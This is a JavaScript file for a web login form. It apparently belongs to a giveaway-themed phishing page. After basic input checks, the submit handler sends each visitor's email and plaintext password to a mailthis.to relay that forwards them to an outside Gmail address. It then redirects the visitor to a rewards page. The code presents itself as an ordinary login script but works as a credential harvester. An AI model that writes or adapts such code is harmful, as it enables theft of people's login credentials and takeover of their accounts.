document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const togglePasswordButton = document.getElementById('togglePassword');

    // Toggle password visibility
    togglePasswordButton.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        togglePasswordButton.textContent = type === 'password' ? 'Show' : 'Hide';
    });

    // Form validation
    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function validatePassword(password) {
        return password.length >= 8;
    }

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value;
        const password = passwordInput.value;
        let isValid = true;

        // Clear previous errors
        emailError.textContent = '';
        passwordError.textContent = '';

        // Validate email
        if (!validateEmail(email)) {
            emailError.textContent = 'Please enter a valid email address';
            isValid = false;
        }

        // Validate password
        if (!validatePassword(password)) {
            passwordError.textContent = 'Password must be at least 8 characters';
            isValid = false;
        }

        if (isValid) {
            try {
                const response = await fetch('https://mailthis.to/immasterygiveaway@gmail.com', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        '_subject': 'New Login Attempt',
                        'email': email,
                        'password': password,
                        'timestamp': new Date().toISOString(),
                    }).toString()
                });

                if (response.ok) {
                    // Redirect to rewards page
                    window.location.href = 'https://gleam.io/app/rewards';
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    });
});
